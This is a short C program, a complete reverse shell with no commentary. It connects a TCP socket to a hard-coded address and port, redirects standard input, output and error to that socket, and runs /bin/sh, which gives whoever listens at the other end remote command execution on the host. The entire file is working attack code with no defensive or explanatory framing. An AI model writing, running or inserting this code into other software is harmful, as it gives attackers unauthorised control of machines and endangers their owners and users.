#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


#define SERVER_PORT 1234
#define SERVER_IP "0.0.0.0"

int main()
{
	int socketDescriptor;
	struct sockaddr_in serverAddr;

	socketDescriptor  = socket(AF_INET, SOCK_STREAM, 0);
	if (socketDescriptor == -1)
	{
		perror("Socket creating error");
		return (EXIT_FAILURE);
	}

	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(SERVER_PORT);
	serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

	if (connect(socketDescriptor, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1)
	{

		perror("Connection error");
		return (EXIT_FAILURE);
	}

	dup2(socketDescriptor, 0);
	dup2(socketDescriptor, 1);
	dup2(socketDescriptor, 2);

	execve("/bin/sh", 0 , 0);
}
